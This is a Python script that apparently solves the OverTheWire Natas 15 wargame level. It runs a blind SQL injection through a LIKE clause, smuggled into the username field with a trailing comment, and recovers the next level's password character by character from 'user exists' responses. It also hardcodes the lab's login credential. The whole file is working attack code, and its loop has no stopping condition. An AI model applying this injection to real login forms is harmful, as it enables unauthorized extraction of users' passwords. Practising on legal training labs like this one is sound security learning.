#!/user/bin/env python
import requests
import  re
from string import *

characters =(ascii_lowercase + ascii_uppercase + digits)
print(characters)
username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'

url ='http://%s.natas.labs.overthewire.org/' % username
session = requests.Session()

#reponse = session.get(url , auth = (username, password))

seen_password =list()

while( True ):
    for ch in characters:

        print("trying with password", "".join(seen_password)+ch)
        reponse = session.post(url ,data={"username" : 'natas16" And password LIKE "' + "".join(seen_password) + ch +'%%" #'},
                                    auth = (username, password))
        content = reponse.text
        if ('user exists 'in content):
            seen_password.append(ch)
            break




print(content)
#print (re.findall('The password for natas12 is